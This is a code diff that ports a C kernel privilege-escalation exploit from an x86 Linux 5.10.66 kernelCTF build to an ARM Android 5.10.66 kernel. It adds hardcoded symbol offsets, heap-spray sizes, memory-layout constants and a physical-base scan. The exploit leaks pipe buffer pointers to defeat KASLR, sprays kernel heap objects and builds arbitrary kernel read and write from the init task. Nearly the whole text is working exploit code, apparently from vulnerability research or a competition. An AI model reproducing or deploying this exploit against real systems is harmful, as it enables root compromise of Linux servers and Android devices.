@@ -507,15 +507,30 @@ usize kaslr_base = 0;
 usize phys_base = 0;
 usize linear_base = 0;
 
-
-#define KERNEL_BASE 0xffffffff81000000
-#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
-#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
-
+#define ARM
 #ifdef ARM
+
+// for arm 5.10.66 android kernel from ingots
 
 #define LIBC_PATH "/apex/com.android.runtime/lib64/bionic/libc.so"
 #define SHELL "/system/bin/sh"
+
+// this kernel does not have kmalloc-192, so object of interest goes in kmalloc-256
+#define SPRAY_SIZE 256
+
+#define KERNEL_BASE 0xffffffc010000000
+
+// on arm this symbol is called memstart_addr
+#define PAGE_OFFSET_BASE (0xffffffc0124c9998 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffc0123396e8 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffc0129cbe40 - KERNEL_BASE)
+
+// first 64 bit word of kernel image
+#define KERNEL_START_WORD 0x149abfff91005a4d
+
+#define VMEMMAP_START 0xfffffffeffe00000
+#define LINEAR_BASE 0xffffff8000000000
+#define PHYS_BASE 0x200000
 
 usize addr_to_page(usize addr) {
   return ((addr >> 12) << 6) + vmem_base;
@@ -526,15 +541,26 @@ usize is_linear_address(usize addr) {
 }
 
 usize is_kernel_address(usize addr) {
-  return (addr & 0xffffffff80000000) == 0xffffffff80000000;
+  return (addr & 0xffffffc000000000) == 0xffffffc000000000;
 }
 
 #else
 
+// for x86 build of 5.10.66 kernel using lts kernel config from kernelctf
+
 #define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"
 #define SHELL "/bin/bash"
 
+#define SPRAY_SIZE 192
+
+#define KERNEL_BASE 0xffffffff81000000
+
 #define PAGE_OFFSET_BASE (0xffffffff82edd490 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
+
+// first 64 bit word of kernel image
+#define KERNEL_START_WORD 0x4802603f51258d48
 
 usize addr_to_page(usize addr) {
   return ((addr >> 12) << 6) + vmem_base;
@@ -603,7 +629,7 @@ void setup_bug() {
   // init_barrier(&context.setup_done_barrier, 2);
   // init_barrier(&context.trigger_barrier, 2);
   // context.read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
-  context.read_poll_fd = SYSCHK(open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY | O_DIRECT | O_NONBLOCK));
+  context.read_poll_fd = SYSCHK(open(LIBC_PATH, O_RDONLY | O_DIRECT | O_NONBLOCK));
   context.buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
   // prefault pipes
@@ -675,8 +701,6 @@ char global_buffer[0x4000] = { 0 };
 
 int pipes[MAX_PIPE_NUM][2] = { 0 };
 int pipe_pages[PIPE_PAGE_NUM][2] = { 0 };
-
-#define SPRAY_SIZE 192
 
 void *do_iov_spray(void *idx) {
   pin_to_cpu(0);
@@ -838,6 +862,37 @@ void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
   }
 }
 
+#ifdef ARM
+
+void scan_kernel_phys_base() {
+  phys_base = PHYS_BASE;
+  // phys_base = 0;
+  // for (;;) {
+  //   usize value = read64(phys_base + 0x38);
+  //   if (!memcmp(&phys_base, "ARMd", 4)) {
+  //     break;
+  //   }
+
+  //   phys_base += 0x1000;
+  // }
+}
+
+#else
+
+void scan_kernel_phys_base() {
+  usize start_bytes = KERNEL_START_WORD;
+  phys_base = 0;
+  for (;;) {
+    if (read64(phys_base) == start_bytes) {
+      break;
+    }
+
+    phys_base += 0x1000;
+  }
+}
+
+#endif
+
 void exploit() {
   int start_step_pipes[2] = { 0 };
   int end_step_pipes[2] = { 0 };
@@ -851,13 +906,6 @@ void exploit() {
   }
 
   pin_to_cpu(0);
-
-  // puts("trigger");
-  // setup_bug();
-  // trigger_bug();
-  // return;
-
-  // char global_buffer[0x100] = { 0 };
 
   for (int i = 0; i < MAX_PIPE_NUM; i++) {
     SYSCHK(pipe(pipes[i]));
@@ -1015,35 +1063,27 @@ void exploit() {
   fwrite("expp", sizeof(char), 4, file);
   fclose(file);
 
-  char command[128] = { 0 };
-  sprintf(command, "cat /proc/%d/comm", getpid());
-
-  system("echo hiiiiiii");
-  system("cat /proc/self/comm");
-  system(command);
-
   printf("leaked pipe page at %lx\n", saved_pipe_buffer_leak.page);
   printf("leaked ops at %lx\n", saved_pipe_buffer_leak.ops);
 
   kaslr_base = saved_pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
   printf("leaked kaslr base: %lx\n", kaslr_base);
 
-  // vmem_base = saved_pipe_buffer_leak.page & 0xfffffffff0000000;
+#ifdef VMEMMAP_START
+  vmem_base = VMEMMAP_START;
+#else
   vmem_base = saved_pipe_buffer_leak.page & 0xfffffffff0000000;
+#endif
   printf("vmemmap base: %lx\n", vmem_base);
 
-  usize start_bytes = 0x4802603f51258d48;
-  phys_base = 0;
-  for (;;) {
-    if (read64(phys_base) == start_bytes) {
-      printf("physical base address: %lx\n", phys_base);
-      break;
-    }
+  scan_kernel_phys_base();
+  printf("physical base address: %lx\n", phys_base);
 
-    phys_base += 0x1000;
-  }
-
+#ifdef LINEAR_BASE
+  linear_base = LINEAR_BASE;
+#else
   linear_base = read64_kernel(kaslr_base + PAGE_OFFSET_BASE);
+#endif
   printf("linear base: %lx\n", linear_base);
 
   usize current_task = INIT_OFFSET + kaslr_base;
@@ -1121,20 +1161,7 @@ int main() {
 
   pin_to_cpu(0);
 
-  // Context context = {
-  //   .io_uring = io_uring_setup(),
-  //   .read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK)),
-  //   .buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
-  // };
-
   exploit();
-
-  // trigger_bug(&context);
-
-  // printf("%lx\n", io_uring_get_cqe(&context.io_uring)[0].user_data);
-  // printf("%d\n", io_uring_get_cqe(&context.io_uring)[0].res);
-
-  // puts(context.buf);
 
   return 0;
 }
